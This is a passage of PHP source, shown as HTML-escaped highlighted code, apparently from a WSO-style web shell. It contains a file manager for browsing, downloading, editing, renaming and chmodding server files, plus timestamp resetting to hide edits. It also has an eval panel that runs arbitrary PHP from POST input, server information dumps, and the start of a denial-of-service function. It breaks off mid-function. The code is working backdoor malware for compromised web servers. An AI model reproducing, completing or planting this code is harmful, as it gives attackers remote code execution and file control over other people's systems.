<span class="x">                    if($GLOBALS[&#39;sort&#39;][0] != &#39;size&#39;)</span>
<span class="x">                            return strcmp(strtolower($a[$GLOBALS[&#39;sort&#39;][0]]), strtolower($b[$GLOBALS[&#39;sort&#39;][0]]))*($GLOBALS[&#39;sort&#39;][1]?1:-1);</span>
<span class="x">                    else</span>
<span class="x">                            return (($a[&#39;size&#39;] &amp;lt; $b[&#39;size&#39;]) ? -1 : 1)*($GLOBALS[&#39;sort&#39;][1]?1:-1);</span>
<span class="x">            }</span>
<span class="x">            usort($files, &quot;wsoCmp&quot;);</span>
<span class="x">            usort($dirs, &quot;wsoCmp&quot;);</span>
<span class="x">            $files = array_merge($dirs, $files);</span>
<span class="x">            $l = 0;</span>
<span class="x">            foreach($files as $f) {</span>
<span class="x">                    echo &#39;&amp;lt;tr&#39;.($l?&#39; class=l1&#39;:&#39;&#39;).&#39;&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;&#39;.(($f[&#39;type&#39;]==&#39;file&#39;)?&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;, \&#39;view\&#39;)&quot;&amp;gt;&#39;.htmlspecialchars($f[&#39;name&#39;]):&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;.$f[&#39;path&#39;].&#39;\&#39;);&quot; title=&#39; . $f[&#39;link&#39;] . &#39;&amp;gt;&amp;lt;b&amp;gt;| &#39; . htmlspecialchars($f[&#39;name&#39;]) . &#39; |&amp;lt;/b&amp;gt;&#39;).&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;.(($f[&#39;type&#39;]==&#39;file&#39;)?madSize($f[&#39;size&#39;]):$f[&#39;type&#39;]).&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;.$f[&#39;modify&#39;].&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;.$f[&#39;owner&#39;].&#39;/&#39;.$f[&#39;group&#39;].&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;,\&#39;chmod\&#39;)&quot;&amp;gt;&#39;.$f[&#39;perms&#39;]</span>
<span class="x">                            .&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;, \&#39;rename\&#39;)&quot;&amp;gt;R&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;, \&#39;touch\&#39;)&quot;&amp;gt;T&amp;lt;/a&amp;gt;&#39;.(($f[&#39;type&#39;]==&#39;file&#39;)?&#39; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;, \&#39;edit\&#39;)&quot;&amp;gt;E&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;, \&#39;download\&#39;)&quot;&amp;gt;D&amp;lt;/a&amp;gt;&#39;:&#39;&#39;).&#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,null,\&#39;delete\&#39;, \&#39;&#39;.urlencode($f[&#39;name&#39;]).&#39;\&#39;)&quot;&amp;gt; X &amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">                    $l = $l?0:1;</span>
<span class="x">            }</span>
<span class="x">            echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=7&amp;gt;</span>
<span class="x">            &amp;lt;input type=hidden name=a value=&#39;FilesMan&#39;&amp;gt;</span>
<span class="x">            &amp;lt;input type=hidden name=c value=&#39;&quot; . htmlspecialchars($GLOBALS[&#39;cwd&#39;]) .&quot;&#39;&amp;gt;</span>
<span class="x">            &amp;lt;input type=hidden name=charset value=&#39;&quot;. (isset($_POST[&#39;charset&#39;])?$_POST[&#39;charset&#39;]:&#39;&#39;).&quot;&#39;&amp;gt;</span>
<span class="x">            &amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&quot;;</span>


<span class="x">        madfooter();</span>
<span class="x">     }</span>

<span class="x">      function madFilesTools() {</span>
<span class="x">            if( isset($_POST[&#39;p1&#39;]) )</span>
<span class="x">                    $_POST[&#39;p1&#39;] = urldecode($_POST[&#39;p1&#39;]);</span>
<span class="x">            if(@$_POST[&#39;p2&#39;]==&#39;download&#39;) {</span>
<span class="x">                    if(@is_file($_POST[&#39;p1&#39;]) &amp;&amp; @is_readable($_POST[&#39;p1&#39;])) {</span>
<span class="x">                            ob_start(&quot;ob_gzhandler&quot;, 4096);</span>
<span class="x">                            header(&quot;Content-Disposition: attachment; filename=&quot;.basename($_POST[&#39;p1&#39;]));</span>
<span class="x">                            if (function_exists(&quot;mime_content_type&quot;)) {</span>
<span class="x">                                    $type = @mime_content_type($_POST[&#39;p1&#39;]);</span>
<span class="x">                                    header(&quot;Content-Type: &quot; . $type);</span>
<span class="x">                            } else</span>
<span class="x">                    header(&quot;Content-Type: application/octet-stream&quot;);</span>
<span class="x">                            $fp = @fopen($_POST[&#39;p1&#39;], &quot;r&quot;);</span>
<span class="x">                            if($fp) {</span>
<span class="x">                                    while(!@feof($fp))</span>
<span class="x">                                            echo @fread($fp, 1024);</span>
<span class="x">                                    fclose($fp);</span>
<span class="x">                            }</span>
<span class="x">                    }exit;</span>
<span class="x">            }</span>
<span class="x">            if( @$_POST[&#39;p2&#39;] == &#39;mkfile&#39; ) {</span>
<span class="x">                    if(!file_exists($_POST[&#39;p1&#39;])) {</span>
<span class="x">                            $fp = @fopen($_POST[&#39;p1&#39;], &#39;w&#39;);</span>
<span class="x">                            if($fp) {</span>
<span class="x">                                    $_POST[&#39;p2&#39;] = &quot;edit&quot;;</span>
<span class="x">                                    fclose($fp);</span>
<span class="x">                            }</span>
<span class="x">                    }</span>
<span class="x">            }</span>

<span class="x">       madhead();</span>
<span class="x">            echo &#39;&amp;lt;div class=header&amp;gt;&#39;;</span>
<span class="x">            if( !file_exists(@$_POST[&#39;p1&#39;]) ) {</span>
<span class="x">                    echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;FILE DOEST NOT EXITS &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">                    madFooter();</span>
<span class="x">                    return;</span>
<span class="x">            }</span>
<span class="x">            $uid = @posix_getpwuid(@fileowner($_POST[&#39;p1&#39;]));</span>
<span class="x">            if(!$uid) {</span>
<span class="x">                    $uid[&#39;name&#39;] = @fileowner($_POST[&#39;p1&#39;]);</span>
<span class="x">                    $gid[&#39;name&#39;] = @filegroup($_POST[&#39;p1&#39;]);</span>
<span class="x">            } else $gid = @posix_getgrgid(@filegroup($_POST[&#39;p1&#39;]));</span>
<span class="x">            echo &#39;&amp;lt;span&amp;gt;Name:&amp;lt;/span&amp;gt; &#39;.htmlspecialchars(@basename($_POST[&#39;p1&#39;])).&#39; &amp;lt;span&amp;gt;Size:&amp;lt;/span&amp;gt; &#39;.(is_file($_POST[&#39;p1&#39;])?madSize(filesize($_POST[&#39;p1&#39;])):&#39;-&#39;).&#39; &amp;lt;span&amp;gt;Permission:&amp;lt;/span&amp;gt; &#39;.madPermsColor($_POST[&#39;p1&#39;]).&#39; &amp;lt;span&amp;gt;Owner/Group:&amp;lt;/span&amp;gt; &#39;.$uid[&#39;name&#39;].&#39;/&#39;.$gid[&#39;name&#39;].&#39;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            echo &#39;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            if( empty($_POST[&#39;p2&#39;]) )</span>
<span class="x">                    $_POST[&#39;p2&#39;] = &#39;view&#39;;</span>
<span class="x">            if( is_file($_POST[&#39;p1&#39;]) )</span>
<span class="x">                    $m = array(&#39;View&#39;, &#39;Highlight&#39;, &#39;Download&#39;, &#39;Edit&#39;, &#39;Chmod&#39;, &#39;Rename&#39;, &#39;Touch&#39;);</span>
<span class="x">            else</span>
<span class="x">                    $m = array(&#39;Chmod&#39;, &#39;Rename&#39;, &#39;Touch&#39;);</span>
<span class="x">            foreach($m as $v)</span>
<span class="x">                    echo &#39;&amp;lt;a  href=# onclick=&quot;g(null,null,null,\&#39;&#39;.strtolower($v).&#39;\&#39;)&quot;&amp;gt;&amp;lt;span&amp;gt;&#39;.((strtolower($v)==@$_POST[&#39;p2&#39;])?&#39;&amp;lt;b&amp;gt;&amp;lt;span&amp;gt; &#39;.$v.&#39; &amp;lt;/span&amp;gt; &amp;lt;/b&amp;gt;&#39;:$v).&#39; &amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt; &#39;;</span>
<span class="x">            echo &#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            switch($_POST[&#39;p2&#39;]) {</span>
<span class="x">                    case &#39;view&#39;:</span>
<span class="x">                            echo &#39;&amp;lt;pre class=ml1&amp;gt;&#39;;</span>
<span class="x">                            $fp = @fopen($_POST[&#39;p1&#39;], &#39;r&#39;);</span>
<span class="x">                            if($fp) {</span>
<span class="x">                                    while( !@feof($fp) )</span>
<span class="x">                                            echo htmlspecialchars(@fread($fp, 1024));</span>
<span class="x">                                    @fclose($fp);</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;/pre&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;highlight&#39;:</span>
<span class="x">                            if( @is_readable($_POST[&#39;p1&#39;]) ) {</span>
<span class="x">                                    echo &#39;&amp;lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&amp;gt;&#39;;</span>
<span class="x">                                    $code = @highlight_file($_POST[&#39;p1&#39;],true);</span>
<span class="x">                                    echo str_replace(array(&#39;&amp;lt;span &#39;,&#39;&amp;lt;/span&amp;gt;&#39;), array(&#39;&amp;lt;font &#39;,&#39;&amp;lt;/font&amp;gt;&#39;),$code).&#39;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">                            }</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;chmod&#39;:</span>
<span class="x">                            if( !empty($_POST[&#39;p3&#39;]) ) {</span>
<span class="x">                                    $perms = 0;</span>
<span class="x">                                    for($i=strlen($_POST[&#39;p3&#39;])-1;$i&amp;gt;=0;--$i)</span>
<span class="x">                                            $perms += (int)$_POST[&#39;p3&#39;][$i]*pow(8, (strlen($_POST[&#39;p3&#39;])-$i-1));</span>
<span class="x">                                    if(!@chmod($_POST[&#39;p1&#39;], $perms))</span>
<span class="x">                                            echo &#39;Can\&#39;t set permissions!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;document.mf.p3.value=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;;</span>
<span class="x">                            }</span>
<span class="x">                            clearstatcache();</span>
<span class="x">                            echo &#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=chmod value=&quot;&#39;.substr(sprintf(&#39;%o&#39;, fileperms($_POST[&#39;p1&#39;])),-4).&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;edit&#39;:</span>
<span class="x">                            if( !is_writable($_POST[&#39;p1&#39;])) {</span>
<span class="x">                                    echo &#39;File isn\&#39;t writeable&#39;;</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            if( !empty($_POST[&#39;p3&#39;]) ) {</span>
<span class="x">                                    $time = @filemtime($_POST[&#39;p1&#39;]);</span>
<span class="x">                                    $_POST[&#39;p3&#39;] = substr($_POST[&#39;p3&#39;],1);</span>
<span class="x">                                    $fp = @fopen($_POST[&#39;p1&#39;],&quot;w&quot;);</span>
<span class="x">                                    if($fp) {</span>
<span class="x">                                            @fwrite($fp,$_POST[&#39;p3&#39;]);</span>
<span class="x">                                            @fclose($fp);</span>
<span class="x">                                            echo &#39;Saved!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;;</span>
<span class="x">                                            @touch($_POST[&#39;p1&#39;],$time,$time);</span>
<span class="x">                                    }</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,\&#39;1\&#39;+this.text.value);return false;&quot;&amp;gt;&amp;lt;textarea name=text class=bigarea&amp;gt;&#39;;</span>
<span class="x">                            $fp = @fopen($_POST[&#39;p1&#39;], &#39;r&#39;);</span>
<span class="x">                            if($fp) {</span>
<span class="x">                                    while( !@feof($fp) )</span>
<span class="x">                                            echo htmlspecialchars(@fread($fp, 1024));</span>
<span class="x">                                    @fclose($fp);</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;hexdump&#39;:</span>
<span class="x">                            $c = @file_get_contents($_POST[&#39;p1&#39;]);</span>
<span class="x">                            $n = 0;</span>
<span class="x">                            $h = array(&#39;00000000&amp;lt;br&amp;gt;&#39;,&#39;&#39;,&#39;&#39;);</span>
<span class="x">                            $len = strlen($c);</span>
<span class="x">                            for ($i=0; $i&amp;lt;$len; ++$i) {</span>
<span class="x">                                    $h[1] .= sprintf(&#39;%02X&#39;,ord($c[$i])).&#39; &#39;;</span>
<span class="x">                                    switch ( ord($c[$i]) ) {</span>
<span class="x">                                            case 0:  $h[2] .= &#39; &#39;; break;</span>
<span class="x">                                            case 9:  $h[2] .= &#39; &#39;; break;</span>
<span class="x">                                            case 10: $h[2] .= &#39; &#39;; break;</span>
<span class="x">                                            case 13: $h[2] .= &#39; &#39;; break;</span>
<span class="x">                                            default: $h[2] .= $c[$i]; break;</span>
<span class="x">                                    }</span>
<span class="x">                                    $n++;</span>
<span class="x">                                    if ($n == 32) {</span>
<span class="x">                                            $n = 0;</span>
<span class="x">                                            if ($i+1 &amp;lt; $len) {$h[0] .= sprintf(&#39;%08X&#39;,$i+1).&#39;&amp;lt;br&amp;gt;&#39;;}</span>
<span class="x">                                            $h[1] .= &#39;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">                                            $h[2] .= &quot;\n&quot;;</span>
<span class="x">                                    }</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;table cellspacing=1 cellpadding=5 bgcolor=black&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=gray&amp;gt;&amp;lt;span style=&quot;font-weight: normal;&quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;.$h[0].&#39;&amp;lt;/pre&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#282828&amp;gt;&amp;lt;pre&amp;gt;&#39;.$h[1].&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;pre&amp;gt;&#39;.htmlspecialchars($h[2]).&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;rename&#39;:</span>
<span class="x">                            if( !empty($_POST[&#39;p3&#39;]) ) {</span>
<span class="x">                                    if(!@rename($_POST[&#39;p1&#39;], $_POST[&#39;p3&#39;]))</span>
<span class="x">                                            echo &#39;Can\&#39;t rename!&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">                                    else</span>
<span class="x">                                            die(&#39;&amp;lt;script&amp;gt;g(null,null,&quot;&#39;.urlencode($_POST[&#39;p3&#39;]).&#39;&quot;,null,&quot;&quot;)&amp;lt;/script&amp;gt;&#39;);</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=name value=&quot;&#39;.htmlspecialchars($_POST[&#39;p1&#39;]).&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">                    case &#39;touch&#39;:</span>
<span class="x">                            if( !empty($_POST[&#39;p3&#39;]) ) {</span>
<span class="x">                                    $time = strtotime($_POST[&#39;p3&#39;]);</span>
<span class="x">                                    if($time) {</span>
<span class="x">                                            if(!touch($_POST[&#39;p1&#39;],$time,$time))</span>
<span class="x">                                                    echo &#39;Fail!&#39;;</span>
<span class="x">                                            else</span>
<span class="x">                                                    echo &#39;Touched!&#39;;</span>
<span class="x">                                    } else echo &#39;Bad time format!&#39;;</span>
<span class="x">                            }</span>
<span class="x">                            clearstatcache();</span>
<span class="x">                            echo &#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=touch value=&quot;&#39;.date(&quot;Y-m-d H:i:s&quot;, @filemtime($_POST[&#39;p1&#39;])).&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;;</span>
<span class="x">                            break;</span>
<span class="x">            }</span>
<span class="x">            echo &#39;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">            madFooter();</span>
<span class="x">    }  </span>

<span class="x">    function madphpeval()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>

<span class="x">        if(isset($_POST[&#39;p2&#39;]) &amp;&amp; ($_POST[&#39;p2&#39;] == &#39;ini&#39;)) {</span>
<span class="x">                    echo &#39;&amp;lt;div class=header&amp;gt;&#39;;</span>
<span class="x">                    ob_start();</span>
<span class="x">                    $INI=ini_get_all();</span>
<span class="x">    print &#39;&amp;lt;table border=0&amp;gt;&amp;lt;tr&amp;gt;&#39;</span>
<span class="x">            .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Param&amp;lt;/td&amp;gt;&#39;</span>
<span class="x">            .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Global value&amp;lt;/td&amp;gt;&#39;</span>
<span class="x">            .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Local Value&amp;lt;/td&amp;gt;&#39;</span>
<span class="x">            .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Access&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">    foreach ($INI as $param =&amp;gt; $values)</span>
<span class="x">            print &quot;\n&quot;.&#39;&amp;lt;tr&amp;gt;&#39;</span>
<span class="x">                    .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;b&amp;gt;&#39;.$param.&#39;&amp;lt;/td&amp;gt;&#39;</span>
<span class="x">                    .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;.$values[&#39;global_value&#39;].&#39; &amp;lt;/td&amp;gt;&#39;</span>
<span class="x">                    .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;.$values[&#39;local_value&#39;].&#39; &amp;lt;/td&amp;gt;&#39;</span>
<span class="x">                    .&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;.$values[&#39;access&#39;].&#39; &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">                    $tmp = ob_get_clean();</span>
<span class="x">            $tmp = preg_replace(&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;,&#39;&#39;,$tmp);</span>
<span class="x">                    $tmp = preg_replace(&#39;!td, th {(.*)}!msiU&#39;,&#39;.e, .v, .h, .h th {$1}&#39;,$tmp);</span>
<span class="x">                    echo str_replace(&#39;&amp;lt;h1&#39;,&#39;&amp;lt;h2&#39;, $tmp) .&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            }</span>

<span class="x">        if(isset($_POST[&#39;p2&#39;]) &amp;&amp; ($_POST[&#39;p2&#39;] == &#39;info&#39;)) {</span>
<span class="x">                    echo &#39;&amp;lt;div class=header&amp;gt;&amp;lt;style&amp;gt;.p {color:#000;}&amp;lt;/style&amp;gt;&#39;;</span>
<span class="x">                    ob_start();</span>
<span class="x">                    phpinfo();</span>
<span class="x">                    $tmp = ob_get_clean();</span>
<span class="x">            $tmp = preg_replace(&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;,&#39;&#39;,$tmp);</span>
<span class="x">                    $tmp = preg_replace(&#39;!td, th {(.*)}!msiU&#39;,&#39;.e, .v, .h, .h th {$1}&#39;,$tmp);</span>
<span class="x">                    echo str_replace(&#39;&amp;lt;h1&#39;,&#39;&amp;lt;h2&#39;, $tmp) .&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            }</span>

<span class="x">        if(isset($_POST[&#39;p2&#39;]) &amp;&amp; ($_POST[&#39;p2&#39;] == &#39;exten&#39;)) {</span>
<span class="x">                    echo &#39;&amp;lt;div class=header&amp;gt;&#39;;</span>
<span class="x">                    ob_start();</span>
<span class="x">                 $EXT=get_loaded_extensions ();</span>
<span class="x">         print &#39;&amp;lt;table border=0&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span>
<span class="x">            .implode(&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;.&quot;\n&quot;.&#39;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;, $EXT)</span>
<span class="x">            .&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span>
<span class="x">            .count($EXT).&#39; extensions loaded&#39;;</span>


<span class="x">            echo &#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;;</span>
<span class="x">            }</span>


<span class="x">            if(empty($_POST[&#39;ajax&#39;]) &amp;&amp; !empty($_POST[&#39;p1&#39;]))</span>
<span class="x">                    $_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]) . &#39;ajax&#39;] = false;</span>
<span class="x">        echo &#39;&amp;lt;div class=header&amp;gt;&amp;lt;Center&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;ini\&#39;)&quot;&amp;gt;| INI_INFO | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;info\&#39;)&quot;&amp;gt;    | phpinfo |&amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;exten\&#39;)&quot;&amp;gt;   | extensions  |&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form name=pf method=post onsubmit=&quot;g(\&#39;phpeval\&#39;,null,this.code.value,\&#39;\&#39;); return false;&quot;&amp;gt;&amp;lt;textarea name=code class=bigarea id=PhpCode&amp;gt;&#39;.(!empty($_POST[&#39;p1&#39;])?htmlspecialchars($_POST[&#39;p1&#39;]):&#39;&#39;).&#39;&amp;lt;/textarea&amp;gt;&amp;lt;center&amp;gt;&amp;lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&amp;gt;&amp;lt;/center&amp;gt;&#39;;</span>
<span class="x">            echo &#39;&amp;lt;/form&amp;gt;&amp;lt;pre id=PhpOutput style=&quot;&#39;.(empty($_POST[&#39;p1&#39;])?&#39;display:none;&#39;:&#39;&#39;).&#39;margin-top:5px;&quot; class=ml1&amp;gt;&#39;;</span>
<span class="x">            if(!empty($_POST[&#39;p1&#39;])) {</span>
<span class="x">                    ob_start();</span>
<span class="x">                    eval($_POST[&#39;p1&#39;]);</span>
<span class="x">                    echo htmlspecialchars(ob_get_clean());</span>
<span class="x">            }</span>
<span class="x">            echo &#39;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&#39;;</span>

<span class="x">        madfooter();</span>
<span class="x">    }</span>

<span class="x">    function madhash()</span>
<span class="x">    {</span>
<span class="x">        if(!function_exists(&#39;hex2bin&#39;)) {function hex2bin($p) {return decbin(hexdec($p));}}</span>
<span class="x">        if(!function_exists(&#39;binhex&#39;)) {function binhex($p) {return dechex(bindec($p));}}</span>
<span class="x">            if(!function_exists(&#39;hex2ascii&#39;)) {function hex2ascii($p){$r=&#39;&#39;;for($i=0;$i&amp;lt;strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}</span>
<span class="x">            if(!function_exists(&#39;ascii2hex&#39;)) {function ascii2hex($p){$r=&#39;&#39;;for($i=0;$i&amp;lt;strlen($p);++$i)$r.= sprintf(&#39;%02X&#39;,ord($p[$i]));return strtoupper($r);}}</span>
<span class="x">            if(!function_exists(&#39;full_urlencode&#39;)) {function full_urlencode($p){$r=&#39;&#39;;for($i=0;$i&amp;lt;strlen($p);++$i)$r.= &#39;%&#39;.dechex(ord($p[$i]));return strtoupper($r);}}</span>
<span class="x">            $stringTools = array(</span>
<span class="x">                    &#39;Base64 encode&#39; =&amp;gt; &#39;base64_encode&#39;,</span>
<span class="x">                    &#39;Base64 decode&#39; =&amp;gt; &#39;base64_decode&#39;,</span>
<span class="x">            &#39;md5 hash&#39; =&amp;gt; &#39;md5&#39;,</span>
<span class="x">                    &#39;sha1 hash&#39; =&amp;gt; &#39;sha1&#39;,</span>
<span class="x">                    &#39;crypt&#39; =&amp;gt; &#39;crypt&#39;,</span>
<span class="x">                    &#39;CRC32&#39; =&amp;gt; &#39;crc32&#39;,</span>
<span class="x">                    &#39;Url encode&#39; =&amp;gt; &#39;urlencode&#39;,</span>
<span class="x">                    &#39;Url decode&#39; =&amp;gt; &#39;urldecode&#39;,</span>
<span class="x">                    &#39;Full urlencode&#39; =&amp;gt; &#39;full_urlencode&#39;,</span>
<span class="x">                    &#39;Htmlspecialchars&#39; =&amp;gt; &#39;htmlspecialchars&#39;,</span>

<span class="x">            );</span>

<span class="x">            madhead();</span>
<span class="x">            echo &#39;&amp;lt;div class=header&amp;gt;&#39;;</span>
<span class="x">            if(empty($_POST[&#39;ajax&#39;])&amp;&amp;!empty($_POST[&#39;p1&#39;]))</span>
<span class="x">                    $_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]).&#39;ajax&#39;] = false;</span>
<span class="x">            echo &quot;&amp;lt;form  onSubmit=&#39;g(null,null,this.selectTool.value,this.input.value); return false;&#39;&amp;gt;&amp;lt;select name=&#39;selectTool&#39;&amp;gt;&quot;;</span>
<span class="x">            foreach($stringTools as $k =&amp;gt; $v)</span>
<span class="x">                    echo &quot;&amp;lt;option value=&#39;&quot;.htmlspecialchars($v).&quot;&#39;&amp;gt;&quot;.$k.&quot;&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">                    echo &quot;&amp;lt;/select&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;/&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&amp;gt;&quot;.(empty($_POST[&#39;p1&#39;])?&#39;&#39;:htmlspecialchars(@$_POST[&#39;p2&#39;])).&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;.(empty($_POST[&#39;p1&#39;])?&#39;display:none;&#39;:&#39;&#39;).&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&amp;gt;&quot;;</span>
<span class="x">            if(!empty($_POST[&#39;p1&#39;])) {</span>
<span class="x">                    if(in_array($_POST[&#39;p1&#39;], $stringTools))echo htmlspecialchars($_POST[&#39;p1&#39;]($_POST[&#39;p2&#39;]));</span>
<span class="x">            }</span>
<span class="x">            echo &quot;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">            madFooter();</span>

<span class="x">    }</span>
<span class="x">    function maddos()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>
<span class="x">        echo &#39;&amp;lt;div class=header&amp;gt;&#39;;</span>
<span class="x">      if(empty($_POST[&#39;ajax&#39;])&amp;&amp;!empty($_POST[&#39;p1&#39;]))</span>
<span class="x">      $_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]).&#39;ajax&#39;] = false;</span>
